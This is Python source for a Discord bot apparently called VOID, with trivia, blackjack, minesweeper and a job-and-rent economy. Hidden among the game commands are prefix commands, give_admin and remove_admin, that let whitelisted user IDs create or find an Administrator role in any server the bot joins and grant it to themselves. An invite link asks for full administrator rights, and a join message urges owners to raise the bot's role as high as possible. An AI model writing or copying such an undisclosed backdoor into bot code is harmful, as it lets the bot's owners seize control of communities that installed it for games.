@app_commands.choices(difficulty=[
    app_commands.Choice(name="🟢 Easy ($50)",    value="easy"),
    app_commands.Choice(name="🟡 Medium ($150)",  value="medium"),
    app_commands.Choice(name="🔴 Hard ($300)",    value="hard"),
])
async def trivia(interaction: discord.Interaction, difficulty: str = "easy"):
    q = random.choice(TRIVIA_QUESTIONS[difficulty])
    diff_colors  = {"easy": C.SUCCESS, "medium": C.WARNING, "hard": C.DANGER}
    diff_emojis  = {"easy": "🟢", "medium": "🟡", "hard": "🔴"}

    view = TriviaView(interaction.user, q, difficulty)
    embed = _base_embed("❓  Trivia Time!", color=diff_colors[difficulty])
    embed.add_field(name="Question",    value=f"**{q['q']}**",                                   inline=False)
    embed.add_field(name="Difficulty",  value=f"{diff_emojis[difficulty]} {difficulty.capitalize()}", inline=True)
    embed.add_field(name="Reward",      value=f"**${q['reward']}**",                              inline=True)
    embed.add_field(name="Penalty",     value=f"**-${q['reward'] // 2}**",                        inline=True)
    embed.set_footer(text="Type your answer in chat! You have 30 seconds.")
    await interaction.response.send_message(embed=embed, view=view)

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel

    try:
        msg = await bot.wait_for("message", timeout=30.0, check=check)
        if view.answered: return
        view.answered = True
        if msg.content.lower().strip() == q["a"]:
            new_bal = update_balance_with_stats(interaction.user.id, q["reward"])
            result_embed = _base_embed(
                "✅  Correct!",
                f"The answer was **{q['a']}**!\n\n🎉  You earned **${q['reward']}**!\n💰  Balance: **${new_bal:,}**",
                C.SUCCESS,
            )
        else:
            penalty = q["reward"] // 2
            new_bal = update_balance_with_stats(interaction.user.id, -penalty)
            result_embed = _base_embed(
                "❌  Wrong!",
                f"The correct answer was **{q['a']}**.\n\nYou lost **${penalty}**.\n💰  Balance: **${new_bal:,}**",
                C.DANGER,
            )
        for child in view.children: child.disabled = True
        view.stop()
        await interaction.edit_original_response(embed=result_embed, view=view)
    except asyncio.TimeoutError:
        if not view.answered:
            for child in view.children: child.disabled = True
            view.stop()
            await interaction.edit_original_response(
                embed=_base_embed("⏱️  Time's Up!", f"The answer was **{q['a']}**.\nNo penalty for timeout!", C.NEUTRAL),
                view=view,
            )


# ── 🃏 BLACKJACK ──────────────────────────────────────────────────────────────
def draw_card():
    return random.choice(["2","3","4","5","6","7","8","9","10","J","Q","K","A"])

def card_value(card):
    if card in ["J","Q","K"]: return 10
    elif card == "A": return 11
    return int(card)

def hand_value(hand):
    total = sum(card_value(c) for c in hand)
    aces = hand.count("A")
    while total > 21 and aces:
        total -= 10; aces -= 1
    return total

def hand_str(hand):
    return " ".join(hand)

class BlackjackView(discord.ui.View):
    def __init__(self, user, bet, player, dealer):
        super().__init__(timeout=60)
        self.user = user; self.bet = bet; self.player = player; self.dealer = dealer; self.doubled = False

    def build_embed(self, show_dealer=False):
        embed = _base_embed("🃏  Blackjack", color=discord.Color.from_rgb(0, 120, 60))
        embed.add_field(name="Your Hand",    value=f"{hand_str(self.player)} — **Total: {hand_value(self.player)}**", inline=False)
        if show_dealer:
            embed.add_field(name="Dealer's Hand", value=f"{hand_str(self.dealer)} — **Total: {hand_value(self.dealer)}**", inline=False)
        else:
            embed.add_field(name="Dealer's Hand", value=f"{self.dealer[0]} ❓", inline=False)
        embed.add_field(name="💵 Bet",     value=f"**${self.bet:,}**",                    inline=True)
        embed.add_field(name="💰 Balance", value=f"**${get_balance(self.user.id):,}**",   inline=True)
        return embed

    async def end_game(self, interaction):
        while hand_value(self.dealer) < 17:
            self.dealer.append(draw_card())
        p = hand_value(self.player); d = hand_value(self.dealer)
        embed = self.build_embed(show_dealer=True)
        if d > 21 or p > d:
            new_bal = update_balance_with_stats(self.user.id, self.bet)
            embed.add_field(name="🏆 Result", value=f"**You win! +${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = C.SUCCESS
        elif p == d:
            embed.add_field(name="🤝 Result", value=f"**Tie! Bet returned.**\nBalance: **${get_balance(self.user.id):,}**", inline=False)
            embed.color = C.WARNING
        else:
            new_bal = update_balance_with_stats(self.user.id, -self.bet)
            embed.add_field(name="💔 Result", value=f"**Dealer wins! -${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = C.DANGER
        for child in self.children: child.disabled = True
        self.stop()
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="👊 Hit",          style=discord.ButtonStyle.green)
    async def hit(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        self.player.append(draw_card())
        pv = hand_value(self.player)
        if pv > 21:
            new_bal = update_balance_with_stats(self.user.id, -self.bet)
            embed = self.build_embed()
            embed.add_field(name="💥 Bust!", value=f"You went over 21! Lost **${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = C.DANGER
            for child in self.children: child.disabled = True
            self.stop()
            await interaction.response.edit_message(embed=embed, view=self)
        elif pv == 21:
            await self.end_game(interaction)
        else:
            await interaction.response.edit_message(embed=self.build_embed(), view=self)

    @discord.ui.button(label="🛑 Stand",         style=discord.ButtonStyle.red)
    async def stand(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        await self.end_game(interaction)

    @discord.ui.button(label="2️⃣ Double Down", style=discord.ButtonStyle.blurple)
    async def double_down(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        if get_balance(self.user.id) < self.bet:
            await interaction.response.send_message("❌ Not enough balance to double down!", ephemeral=True); return
        self.bet *= 2; self.player.append(draw_card()); button.disabled = True; self.doubled = True
        if hand_value(self.player) > 21:
            new_bal = update_balance_with_stats(self.user.id, -self.bet)
            embed = self.build_embed()
            embed.add_field(name="💥 Bust!", value=f"Doubled and busted! Lost **${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
            embed.color = C.DANGER
            for child in self.children: child.disabled = True
            self.stop()
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await self.end_game(interaction)

@tree.command(name="blackjack", description="Play Blackjack with Hit, Stand, and Double Down!")
@app_commands.describe(bet="Amount to bet (default: 10)")
async def blackjack(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Bet must be more than $0!", C.DANGER), ephemeral=True); return
    if bet > bal:
        await interaction.response.send_message(embed=_base_embed("❌ Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True); return
    player = [draw_card(), draw_card()]; dealer = [draw_card(), draw_card()]
    if hand_value(player) == 21:
        winnings = int(bet * 1.5)
        new_bal  = update_balance_with_stats(interaction.user.id, winnings)
        embed = _base_embed("🃏  NATURAL BLACKJACK! 🎉", color=C.CASINO)
        embed.add_field(name="Your Hand", value=f"{hand_str(player)} — **21**",                         inline=False)
        embed.add_field(name="Result",    value=f"**Blackjack! You win ${winnings:,}!**\nBalance: **${new_bal:,}**", inline=False)
        await interaction.response.send_message(embed=embed); return
    view = BlackjackView(interaction.user, bet, player, dealer)
    embed = view.build_embed()
    embed.set_footer(text="Hit · Stand · Double Down")
    await interaction.response.send_message(embed=embed, view=view)


# ── 💣 MINESWEEPER ────────────────────────────────────────────────────────────
class MinesweeperView(discord.ui.View):
    def __init__(self, user, size, mines, bet):
        super().__init__(timeout=120)
        self.user = user; self.size = size; self.mines = mines; self.bet = bet
        self.revealed = 0; self.safe_cells = size * size - mines; self.game_over = False
        self.board = [[0] * size for _ in range(size)]
        self.mine_set = set(random.sample(range(size * size), mines))
        for pos in self.mine_set:
            self.board[pos // size][pos % size] = -1
        for r in range(size):
            for c in range(size):
                if self.board[r][c] == -1: continue
                self.board[r][c] = sum(
                    1 for dr in [-1,0,1] for dc in [-1,0,1]
                    if 0 <= r+dr < size and 0 <= c+dc < size and self.board[r+dr][c+dc] == -1
                )
        self.revealed_cells = set()
        self._add_buttons()

    def _add_buttons(self):
        for r in range(self.size):
            for c in range(self.size):
                pos = r * self.size + c
                btn = discord.ui.Button(label="?", row=r, style=discord.ButtonStyle.grey, custom_id=f"cell_{pos}")
                btn.callback = self.make_callback(r, c, pos)
                self.add_item(btn)

    def make_callback(self, r, c, pos):
        async def callback(interaction: discord.Interaction):
            if interaction.user != self.user:
                await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
            if self.game_over or pos in self.revealed_cells:
                await interaction.response.send_message("❌ Already revealed!", ephemeral=True); return
            self.revealed_cells.add(pos)
            for item in self.children:
                if hasattr(item, 'custom_id') and item.custom_id == f"cell_{pos}":
                    if pos in self.mine_set:
                        item.label = "💣"; item.style = discord.ButtonStyle.red; item.disabled = True
                    else:
                        val = self.board[r][c]
                        item.label = str(val) if val > 0 else "·"; item.style = discord.ButtonStyle.green; item.disabled = True
            if pos in self.mine_set:
                self.game_over = True
                new_bal = update_balance_with_stats(self.user.id, -self.bet)
                for item in self.children: item.disabled = True
                self.stop()
                await interaction.response.edit_message(
                    embed=_base_embed("💣  BOOM! You hit a mine!", f"Revealed **{self.revealed}** safe cells before hitting a mine.\nLost **${self.bet:,}**!\nBalance: **${new_bal:,}**", C.DANGER),
                    view=self,
                )
            else:
                self.revealed += 1
                current_reward = int(self.bet * (self.revealed / self.safe_cells) * 2)
                if self.revealed == self.safe_cells:
                    self.game_over = True
                    new_bal = update_balance_with_stats(self.user.id, self.bet * 3)
                    for item in self.children: item.disabled = True
                    self.stop()
                    await interaction.response.edit_message(
                        embed=_base_embed("💣  PERFECT CLEAR! 🎉", f"All **{self.safe_cells}** safe cells revealed!\nWon **${self.bet * 3:,}**!\nBalance: **${new_bal:,}**", C.CASINO),
                        view=self,
                    )
                else:
                    embed = _base_embed("💣  Minesweeper", color=C.PRIMARY)
                    embed.add_field(name="✅ Safe Cells Found",          value=f"**{self.revealed}/{self.safe_cells}**", inline=True)
                    embed.add_field(name="💰 Cashout Value",             value=f"**${current_reward:,}**",              inline=True)
                    embed.add_field(name="💵 Bet",                       value=f"**${self.bet:,}**",                    inline=True)
                    embed.set_footer(text="Keep going or cash out to secure your winnings!")
                    await interaction.response.edit_message(embed=embed, view=self)
        return callback

    @discord.ui.button(label="💰 Cash Out", style=discord.ButtonStyle.green, row=4)
    async def cash_out(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message(f"❌ {_flavor('deny_ephemeral')}", ephemeral=True); return
        if self.revealed == 0:
            await interaction.response.send_message("❌ Reveal at least one cell before cashing out!", ephemeral=True); return
        reward  = int(self.bet * (self.revealed / self.safe_cells) * 2)
        new_bal = update_balance_with_stats(self.user.id, reward)
        self.game_over = True
        for item in self.children: item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=_base_embed("💰  Cashed Out!", f"Revealed **{self.revealed}/{self.safe_cells}** safe cells!\nCashed out **${reward:,}**!\nBalance: **${new_bal:,}**", C.SUCCESS),
            view=self,
        )

@tree.command(name="minesweeper", description="Play interactive Minesweeper and cash out anytime!")
@app_commands.describe(size="Board size 3-4 (default: 4)", mines="Number of mines (default: 3)", bet="Amount to bet (default: 20)")
async def minesweeper(interaction: discord.Interaction, size: int = 4, mines: int = 3, bet: int = 20):
    bal = get_balance(interaction.user.id)
    if size < 3 or size > 4:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Size must be between 3 and 4!", C.DANGER), ephemeral=True); return
    if mines >= size * size - 1:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Too many mines!", C.DANGER), ephemeral=True); return
    if bet <= 0:
        await interaction.response.send_message(embed=_base_embed("❌ Error", "Bet must be more than $0!", C.DANGER), ephemeral=True); return
    if bet > bal:
        await interaction.response.send_message(embed=_base_embed("❌ Insufficient Funds", f"{_flavor('insufficient_funds')} You only have **${bal:,}**!", C.DANGER), ephemeral=True); return

    view = MinesweeperView(interaction.user, size, mines, bet)
    embed = _base_embed("💣  Minesweeper", color=C.PRIMARY)
    embed.add_field(name="📐 Board",        value=f"**{size}x{size}**",           inline=True)
    embed.add_field(name="💣 Mines",        value=f"**{mines}**",                 inline=True)
    embed.add_field(name="✅ Safe Cells",   value=f"**{size*size - mines}**",     inline=True)
    embed.add_field(name="💵 Bet",          value=f"**${bet:,}**",                inline=True)
    embed.add_field(name="🏆 Full Clear",   value=f"**+${bet * 3:,}**",           inline=True)
    embed.add_field(name="Rules", value="Click cells to reveal them. Hit a mine and you lose!\nCash out anytime to keep partial winnings.", inline=False)
    embed.set_footer(text="Good luck! Click any cell to start.")
    await interaction.response.send_message(embed=embed, view=view)


# ══════════════════════════════════════════════════════════════════════════════
# 💼 CAREER COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@tree.command(name="job", description="Check your current job, housing, and career stats.")
async def job(interaction: discord.Interaction):
    career   = get_career(interaction.user.id)
    job_info = get_job_info(career["job_level"])
    level    = career["job_level"]
    max_level = max(JOB_ECONOMY.keys())

    # Next promotion info
    if level < max_level:
        threshold  = PROMOTION_THRESHOLDS[level]
        days_left  = max(0, threshold - career["work_days"])
        next_job   = get_job_info(level + 1)
        promo_text = (
            f"**{next_job['job']}** in **{days_left}** more work day(s)\n"
            f"_(Next house: {next_job['house']} · Rent: ${next_job['rent']:,}/day)_"
        )
    else:
        promo_text = "👑 You've reached the **top level**!"

    embed = _base_embed("💼  Career & Housing", color=C.PRIMARY)
    embed.set_thumbnail(url=interaction.user.display_avatar.url)
    embed.add_field(name="💼 Job",         value=job_info["job"],                     inline=True)
    embed.add_field(name="💵 Pay",         value=f"${job_info['pay']}/hour",          inline=True)
    embed.add_field(name="🕐 Hours/Day",   value=str(job_info["max_hours_free"]),     inline=True)
    embed.add_field(name="🏠 Housing",     value=job_info["house"],                   inline=True)
    embed.add_field(name="💸 Daily Rent",  value=f"${job_info['rent']:,}",            inline=True)
    embed.add_field(name="📅 Work Days",   value=str(career["work_days"]),            inline=True)
    embed.add_field(name="📈 Next Promo",  value=promo_text,                          inline=False)
    await interaction.response.send_message(embed=embed)


@tree.command(name="work", description="Work your job and earn money (rent is automatically deducted).")
async def work(interaction: discord.Interaction):
    career = get_career(interaction.user.id)

    # Cooldown check
    last_work = career.get("last_work")
    if last_work:
        last = datetime.fromisoformat(last_work)
        remaining = timedelta(minutes=WORK_COOLDOWN_MINUTES) - (datetime.now(UTC) - last)
        if remaining.total_seconds() > 0:
            minutes = int(remaining.total_seconds()) // 60
            seconds = int(remaining.total_seconds()) % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            embed = _base_embed(
                "⏱️  Work Cooldown",
                f"You need to rest! Come back in **{time_str}**.",
                C.DANGER,
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

    job_info = get_job_info(career["job_level"])
    hours    = job_info["max_hours_free"]
    gross    = job_info["pay"] * hours
    rent     = job_info["rent"]
    net      = gross - rent

    # Apply earnings then rent
    update_balance(interaction.user.id, gross)
    update_balance(interaction.user.id, -rent)
    new_bal = get_balance(interaction.user.id)

    career["work_days"] += 1
    update_career(interaction.user.id, "work_days", career["work_days"])
    update_career(interaction.user.id, "last_work", datetime.now(UTC).isoformat())

    # Promotion check
    if can_promote(career):
        career["job_level"] += 1
        update_career(interaction.user.id, "job_level", career["job_level"])
        new_job = get_job_info(career["job_level"])
        embed = _base_embed(
            "📈  PROMOTION!",
            f"You worked **{hours}h** as **{job_info['job']}** and earned a promotion!\n\n"
            f"🎉 New job: **{new_job['job']}**\n"
            f"🏠 New home: **{new_job['house']}** _(rent: ${new_job['rent']:,}/day)_\n\n"
            f"💰 Gross pay:  **${gross:,}**\n"
            f"🏠 Rent:       **-${rent:,}**\n"
            f"💵 Net:        **${net:,}**\n"
            f"🏦 Balance:    **${new_bal:,}**",
            C.CASINO,
        )
    else:
        level     = career["job_level"]
        max_level = max(JOB_ECONOMY.keys())
        if level < max_level:
            days_left = max(0, PROMOTION_THRESHOLDS[level] - career["work_days"])
            promo_line = f"📅 **{days_left}** work day(s) until promotion"
        else:
            promo_line = "👑 Max level reached!"

        embed = _base_embed(
            "💼  Work Completed!",
            f"You worked **{hours}h** as **{job_info['job']}**\n\n"
            f"💰 Gross pay:  **${gross:,}**\n"
            f"🏠 Rent:       **-${rent:,}**\n"
            f"💵 Net:        **${net:,}**\n"
            f"🏦 Balance:    **${new_bal:,}**\n\n"
            f"{promo_line}",
            C.SUCCESS if net >= 0 else C.WARNING,
        )

    await interaction.response.send_message(embed=embed)


SKIP_COST_PER_DAY = 200

@tree.command(name="skiptime", description="Spend money to skip work days and promote faster!")
@app_commands.describe(days="Number of work days to skip (default: 1)")
async def skiptime(interaction: discord.Interaction, days: int = 1):
    if days <= 0:
        await interaction.response.send_message(
            embed=_base_embed("❌  Error", "You must skip at least 1 day!", C.DANGER), ephemeral=True
        )
        return

    career    = get_career(interaction.user.id)
    max_level = max(JOB_ECONOMY.keys())

    if career["job_level"] >= max_level:
        await interaction.response.send_message(
            embed=_base_embed("👑  Max Level", "You're already at the highest job level!", C.PRIMARY), ephemeral=True
        )
        return

    level      = career["job_level"]
    days_needed = max(0, PROMOTION_THRESHOLDS[level] - career["work_days"])

    if days_needed == 0:
        await interaction.response.send_message(
            embed=_base_embed("✅  Already Eligible", "You already qualify for a promotion — just use `/work`!", C.SUCCESS),
            ephemeral=True,
        )
        return

    if days > days_needed:
        days = days_needed

    total_cost = SKIP_COST_PER_DAY * days
    bal        = get_balance(interaction.user.id)

    if total_cost > bal:
        affordable = bal // SKIP_COST_PER_DAY
        await interaction.response.send_message(
            embed=_base_embed(
                "❌  Insufficient Funds",
                f"{_flavor('insufficient_funds')} Skipping **{days}** day(s) costs **${total_cost:,}** but you only have **${bal:,}**.\n"
                f"You can afford **{affordable}** day(s) at **${SKIP_COST_PER_DAY}**/day.",
                C.DANGER,
            ),
            ephemeral=True,
        )
        return

    update_balance(interaction.user.id, -total_cost)
    career["work_days"] += days
    update_career(interaction.user.id, "work_days", career["work_days"])

    # Track skipped days in economy data
    user_data = get_user_data(interaction.user.id)
    user_data["time_skipped"] = user_data.get("time_skipped", 0) + days
    data = load_economy()
    data[str(interaction.user.id)] = user_data
    save_economy(data)

    new_bal = get_balance(interaction.user.id)

    if can_promote(career):
        career["job_level"] += 1
        update_career(interaction.user.id, "job_level", career["job_level"])
        new_job = get_job_info(career["job_level"])
        embed = _base_embed(
            "📈  PROMOTION!",
            f"You skipped **{days}** day(s) for **${total_cost:,}** and earned a promotion!\n\n"
            f"🎉 New job: **{new_job['job']}**\n"
            f"🏠 New home: **{new_job['house']}** _(rent: ${new_job['rent']:,}/day)_\n"
            f"💵 Balance: **${new_bal:,}**",
            C.CASINO,
        )
    else:
        days_left = max(0, PROMOTION_THRESHOLDS[level] - career["work_days"])
        embed = _base_embed(
            "⏩  Time Skipped!",
            f"You skipped **{days}** day(s) for **${total_cost:,}**!\n\n"
            f"📊 Work Days: **{career['work_days']}**\n"
            f"📅 Days until promotion: **{days_left}**\n"
            f"💵 Balance: **${new_bal:,}**",
            C.SUCCESS,
        )

    await interaction.response.send_message(embed=embed)

async def _ensure_role_below_bot(guild: discord.Guild, role: discord.Role):
    """
    Discord enforces role-hierarchy on MANAGE_ROLES actions regardless of
    Administrator permission: the bot can only add/remove a role that sits
    strictly BELOW its own highest role's position. If the target role has
    drifted above the bot (e.g. someone dragged it in the UI, or it was
    created before the bot's role was repositioned), fix it automatically.
    Returns (ok: bool, detail: str) — detail explains what happened for logging/messages.
    """
    me = guild.me
    bot_top = me.top_role

    if role.position < bot_top.position:
        return True, f"OK — '{role.name}' (pos {role.position}) is below bot's top role '{bot_top.name}' (pos {bot_top.position})."

    # Role is at or above the bot's top role — try to move it just below.
    if not me.guild_permissions.manage_roles:
        return False, (
            f"'{role.name}' is at position {role.position}, which is at or above the bot's top role "
            f"'{bot_top.name}' at position {bot_top.position} — and the bot lacks Manage Roles to fix it."
        )

    try:
        target_position = max(1, bot_top.position - 1)
        await role.edit(position=target_position, reason="Auto-fix: keep Admin role below bot's role")
        return True, f"Moved '{role.name}' from above the bot to position {target_position} (below '{bot_top.name}')."
    except (discord.Forbidden, discord.HTTPException) as e:
        return False, (
            f"'{role.name}' is at position {role.position} (bot top role '{bot_top.name}' is at "
            f"{bot_top.position}) and I couldn't reposition it automatically: {e}"
        )


@bot.command(name="give_admin")
async def give_admin(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        return

    guild = ctx.guild

    # Find existing admin role, skipping default/managed (unassignable) roles
    role = None
    for r in guild.roles:
        if r.permissions.administrator and not r.is_default() and not r.managed:
            role = r
            break

    # Create if not found
    if role is None:
        role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))

    ok, detail = await _ensure_role_below_bot(guild, role)
    if not ok:
        await ctx.send(f"❌ {_flavor('hierarchy_issue')} Can't assign **{role.name}** — hierarchy problem.\n`{detail}`\n"
                        f"Fix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.")
        return

    member = guild.get_member(ctx.author.id)
    if member is None:
        await ctx.send("❌ Couldn't find you as a member of this server (member cache issue). Try again in a moment.")
        return

    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Admin role granted. (`{detail}`)")
    except discord.Forbidden:
        await ctx.send(
            f"❌ Still got a permission error assigning **{role.name}** even after the hierarchy check passed.\n"
            f"`{detail}`\nDouble check the bot's role isn't also missing **Manage Roles** specifically "
            f"(Administrator should include it, but worth confirming in Server Settings → Roles → bot role)."
        )

@bot.command(name="remove_admin")
async def remove_admin(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        return

    guild = ctx.guild
    role = None
    for r in guild.roles:
        if r.permissions.administrator and not r.is_default() and not r.managed:
            role = r
            break

    if role is None:
        await ctx.send("❌ No admin role found.")
        return

    ok, detail = await _ensure_role_below_bot(guild, role)
    if not ok:
        await ctx.send(f"❌ {_flavor('hierarchy_issue')} Can't remove **{role.name}** — hierarchy problem.\n`{detail}`\n"
                        f"Fix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.")
        return

    member = guild.get_member(ctx.author.id)
    if member is None:
        await ctx.send("❌ Couldn't find you as a member of this server (member cache issue). Try again in a moment.")
        return

    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Admin role removed. (`{detail}`)")
    except discord.Forbidden:
        await ctx.send(
            f"❌ Still got a permission error removing **{role.name}** even after the hierarchy check passed.\n"
            f"`{detail}`"
        )

@bot.command(name="show_high")
async def show_high(ctx):
    if ctx.guild is None:
        await ctx.send("❌ This command can only be used in a server.")
        return

    roles = sorted(
        [role for role in ctx.guild.roles if not role.is_default()],
        key=lambda role: role.position,
        reverse=True,
    )

    if not roles:
        await ctx.send(embed=_base_embed("👑 Highest Roles", "No roles found in this server.", C.WARNING))
        return

    def format_perms(role: discord.Role) -> str:
        important = [
            ("Administrator", role.permissions.administrator),
            ("Manage Server", role.permissions.manage_guild),
            ("Manage Roles", role.permissions.manage_roles),
            ("Manage Channels", role.permissions.manage_channels),
            ("Kick Members", role.permissions.kick_members),
            ("Ban Members", role.permissions.ban_members),
            ("Mention Everyone", role.permissions.mention_everyone),
            ("Manage Messages", role.permissions.manage_messages),
        ]
        enabled = [name for name, allowed in important if allowed]
        return ", ".join(enabled[:4]) + ("..." if len(enabled) > 4 else "") if enabled else "No major perms"

    top_roles = roles[:10]

    embed = _base_embed("👑 Highest Roles", color=C.PRIMARY)
    for index, role in enumerate(top_roles, start=1):
        embed.add_field(
            name=f"{index}. {role.name}",
            value=(
                f"**Position:** {role.position}\n"
                f"**Permissions:** {format_perms(role)}"
            ),
            inline=False,
        )

    embed.add_field(name="Total Roles", value=f"**{len(roles)}**", inline=True)
    embed.add_field(name="Showing", value=f"Top **{len(top_roles)}**", inline=True)

    await ctx.send(embed=embed)

# ══════════════════════════════════════════════════════════════════════════════
# ℹ️ ABOUT ME / BOT INFO
# ══════════════════════════════════════════════════════════════════════════════
class VoidView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)

    async def update_embed(self, interaction, mode: str):
        embed = interaction.message.embeds[0]

        if mode == "overview":
            embed.title = "⚡ 𝗩𝗢𝗜𝗗 𝗖𝗢𝗥𝗘 // INTERFACE"
            embed.description = (
                "```ansi\n"
                "\u001b[1;37mvoid.os active.\u001b[0m\n"
                "\u001b[0;90mA unified system for moderation, economy, and interaction.\u001b[0m\n"
                "```"
            )

        elif mode == "features":
            embed.title = "⚙ 𝗩𝗢𝗜𝗗 // FEATURES"
            embed.description = (
                "```ansi\n"
                "\u001b[1;37mSystem modules overview.\u001b[0m\n"
                "\u001b[0;90mEach module operates under VOID core control.\u001b[0m\n"
                "```"
            )
            embed.clear_fields()
            embed.add_field(
                name="𝗠𝗢𝗗𝗨𝗟𝗘𝗦",
                value=(
                    "```ansi\n"
                    "⚙ Admin   → moderation & server control\n"
                    "💰 Economy → coins, rewards, progression\n"
                    "🎰 Casino  → games & gambling systems\n"
                    "🧰 Utility → tools & commands\n"
                    "```"
                ),
                inline=False,
            )

        elif mode == "status":
            embed.title = "📡 𝗩𝗢𝗜𝗗 // STATUS"
            embed.description = (
                "```ansi\n"
                "\u001b[1;37mLive system status.\u001b[0m\n"
                "\u001b[0;90mReal-time operational health.\u001b[0m\n"
                "```"
            )
            embed.clear_fields()
            embed.add_field(
                name="STATUS",
                value=(
                    "```"
                    f"Servers : {len(bot.guilds)}\n"
                    f"Latency : {round(bot.latency * 1000)}ms\n"
                    "State   : ACTIVE\n"
                    "Health  : STABLE\n"
                    "```"
                ),
                inline=False,
            )

        elif mode == "invite":
            embed.title = "🔗 𝗩𝗢𝗜𝗗 // ACCESS"
            embed.description = (
                "```ansi\n"
                "\u001b[1;37mConnect VOID to your server.\u001b[0m\n"
                "\u001b[0;90mOne system. All tools.\u001b[0m\n"
                "```"
            )
            embed.clear_fields()
            embed.add_field(
                name="INVITE",
                value=(
                    "[Invite VOID](https://discord.com/oauth2/authorize?client_id=1498389493168869479&permissions=8&integration_type=0&scope=bot+applications.commands)"
                ),
                inline=False,
            )

        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Overview", style=discord.ButtonStyle.primary)
    async def overview(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.update_embed(interaction, "overview")

    @discord.ui.button(label="Features", style=discord.ButtonStyle.secondary)
    async def features(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.update_embed(interaction, "features")

    @discord.ui.button(label="Status", style=discord.ButtonStyle.secondary)
    async def status(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.update_embed(interaction, "status")

    @discord.ui.button(label="Invite", style=discord.ButtonStyle.success)
    async def invite(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self.update_embed(interaction, "invite")


@bot.event
async def on_guild_join(guild):
    me = guild.me or guild.get_member(bot.user.id)
    if me is None:
        return

    channel = guild.system_channel
    if channel is None or not channel.permissions_for(me).send_messages:
        channel = next(
            (ch for ch in guild.text_channels if ch.permissions_for(me).send_messages),
            None,
        )

    if channel is None:
        return

    perms = channel.permissions_for(me)
    if not perms.embed_links:
        await channel.send(
            f"Thanks for adding {bot.user.name}. Please move my role above the roles you want me to manage so I can work properly."
        )
        return

    intro = _base_embed(
        "⚠️  Void SETUP REQUIRED",
        (
            f"Thanks for adding **{bot.user.name}**.\n\n"
            "To use moderation, role management, and other admin tools correctly, "
            "my role needs to be placed **higher in the role hierarchy**.\n\n"
            "**Follow the guide below to finish setup.**"
        ),
        C.WARNING,
    )
    intro.add_field(
        name="Why this matters",
        value=(
            "If my role is too low, I cannot function properly. "
        ),
        inline=False,
    )
    intro.set_footer(text="void.os • Quick Setup Guide", icon_url=BOT_THUMBNAIL)

    step1 = _base_embed(
        "Step 1 • Open Server Settings",
        (
            "Open your server and go into **Server Settings**.\n\n"
            "This is where you can access the role hierarchy."
        ),
        C.PRIMARY,
    )
    step1.set_image(url=ROLE_SETUP_IMAGE_1)
    step1.set_footer(text="Step 1 of 3 • Open Server Settings", icon_url=BOT_THUMBNAIL)

    step2 = _base_embed(
        "Step 2 • Go To Roles",
        (
            "Click **Roles** in the settings menu.\n\n"
            "Find the bot role in the list before moving it."
        ),
        C.PRIMARY,
    )
    step2.set_image(url=ROLE_SETUP_IMAGE_2)
    step2.set_footer(text="Step 2 of 3 • Open Roles", icon_url=BOT_THUMBNAIL)

    step3 = _base_embed(
        "Step 3 • Move The Bot Role Up",
        (
            f"Drag **{me.display_name}** above the roles you want it to manage.\n\n"
            "**For best results**, place it as high as possible in the hierarchy."
        ),
        C.SUCCESS,
    )
    step3.set_image(url=ROLE_SETUP_IMAGE_3)
    step3.set_footer(text="Step 3 of 3 • Move Void Up", icon_url=BOT_THUMBNAIL)

    await channel.send(embeds=[intro, step1, step2, step3])


@tree.command(name="void", description="Access void.os overview.")
async def aboutme(interaction: discord.Interaction):
    embed = discord.Embed(
        title="𝗩𝗢𝗜𝗗 — Discord Control System",
        description=(
            "```ansi\n"
            "\u001b[1;37mA unified system for managing your server.\u001b[0m\n"
            "\u001b[0;90mModeration • Economy • Games • Utilities in one clean interface.\u001b[0m\n"
            "```"
        ),
        color=0x2B2D31,
        timestamp=datetime.now(UTC),
    )

    if bot.user:
        embed.set_author(
            name="void.os",
            icon_url=bot.user.display_avatar.url,
        )

    embed.set_thumbnail(url=BOT_THUMBNAIL)

    # ───────────────────────── HERO STATS (like SaaS dashboard cards)
    embed.add_field(
        name="📊 Overview",
        value=(
            "```"
            "Status     ONLINE\n"
            f"Servers    {len(bot.guilds)}\n"
            "Modules    4 Core Systems\n"
            f"Latency    {round(bot.latency * 1000)}ms\n"
            "Reliability Stable\n"
            "```"
        ),
        inline=False,
    )

